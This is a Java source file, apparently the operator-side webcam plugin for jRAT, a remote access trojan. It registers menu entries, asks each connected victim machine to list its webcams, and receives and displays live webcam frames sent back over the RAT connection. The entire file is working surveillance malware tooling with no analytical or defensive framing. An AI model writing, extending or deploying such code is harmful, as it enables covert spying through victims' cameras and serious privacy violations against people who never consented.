package se.jrat.plugin.webcam.client;

import java.awt.Graphics;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import javax.swing.ImageIcon;

import jrat.api.RATControlMenuEntry;
import jrat.api.RATMenuItem;
import jrat.api.RATObject;
import jrat.api.RATPlugin;
import jrat.api.Reader;
import jrat.api.events.OnConnectEvent;
import jrat.api.events.OnDisableEvent;
import jrat.api.events.OnDisconnectEvent;
import jrat.api.events.OnEnableEvent;
import jrat.api.events.OnPacketEvent;
import jrat.api.events.OnSendPacketEvent;

public class WebcamPlugin extends RATPlugin {

	public static final String ICON_LOCATION = System.getProperty("jrat.dir") + File.separator + "/files/plugins/Webcam/icon.png";
	public static final byte HEADER = 120;
	public static final byte LIST_WEBCAM_HEADER = 121;

	public static RATControlMenuEntry entry;
	public static boolean enabled;
	
	public static Map<RATObject, List<String>> map = new HashMap<RATObject, List<String>>();

	public WebcamPlugin() {
		super("Webcam", "1.1.1", "Webcam Plugin", "jRAT");
	}

	public void onEnable(OnEnableEvent event) throws Exception {
		try {
			Properties prop = new Properties();
			prop.load(new FileInputStream(System.getProperty("jrat.dir") + File.separator + "files/plugins/Webcam/config.properties"));

			PanelWebcam.WIDTH = Integer.parseInt(prop.getProperty("width"));
			PanelWebcam.HEIGHT = Integer.parseInt(prop.getProperty("height"));
		} catch (FileNotFoundException ex) {
			
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void onDisable(OnDisableEvent event) throws Exception {
		
	}

	public void onPacket(OnPacketEvent event) throws Exception {
		if (event.getPacket().getHeader() == HEADER) {
			String name = readString(event.getServer().getDataReader());

			PanelWebcam panel = (PanelWebcam) WebcamPlugin.entry.instances.get(event.getServer().getIP());
			
			if (name.equals("DISABLED")) {
				enabled = false;

				if (panel != null) {
					panel.setNoWebcamFound();
				}
			} else {
				int size = event.getServer().getDataReader().readInt();
				byte[] buffer = new byte[size];
				event.getServer().getDataReader().readFully(buffer, 0, buffer.length);
				
				if (panel != null) {
					panel.setCamName(name);

					BufferedImage image = ImageUtils.decodeImage(buffer);

					Graphics g = panel.image.getGraphics();
					g.drawImage(image, 0, 0, panel.image.getWidth(), panel.image.getHeight(), null);

					panel.lbl.repaint();
				}
			}
		} else if (event.getPacket().getHeader() == LIST_WEBCAM_HEADER) {
			int len = event.getServer().getDataReader().readInt();
			
			List<String> webcams = new ArrayList<String>();
			
			for (int i = 0; i < len; i++) {
				webcams.add(WebcamPlugin.readString(event.getServer().getDataReader()));
				map.put(event.getServer(), webcams);
			}
		}
	}

	public static String readString(Reader dataReader) throws Exception {
		short len = dataReader.readShort();
		StringBuffer buffer = new StringBuffer();
		for (short s = 0; s < len; s++) {
			buffer.append(dataReader.readChar());
		}
		
		return buffer.toString();
	}

	public void onConnect(final OnConnectEvent event) throws Exception {
		new Thread(new Runnable() {
			public void run() {
				try {
					Thread.sleep(2000L);
					event.getServer().addToSendQueue(new Packet121ListWebcams(event.getServer()));
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		}).start();
	}

	public void onDisconnect(OnDisconnectEvent event) throws Exception {

	}

	public List<RATMenuItem> getMenuItems() {
		List<RATMenuItem> list = new ArrayList<RATMenuItem>();
		RATMenuItem entry = new RATMenuItem(new MenuListener(), "Webcam", new ImageIcon(ICON_LOCATION));

		list.add(entry);
		return list;
	}

	public List<RATControlMenuEntry> getControlTreeItems() throws Exception {
		List<RATControlMenuEntry> list = new ArrayList<RATControlMenuEntry>();
		entry = new RATControlMenuEntry("Webcam", new ImageIcon(ICON_LOCATION), PanelWebcam.class);

		list.add(entry);
		return list;
	}

	public void onSendPacket(OnSendPacketEvent event) throws Exception {

	}

	@Override
	public ActionListener getGlobalMenuItemListener() {
		return null;
	}

}
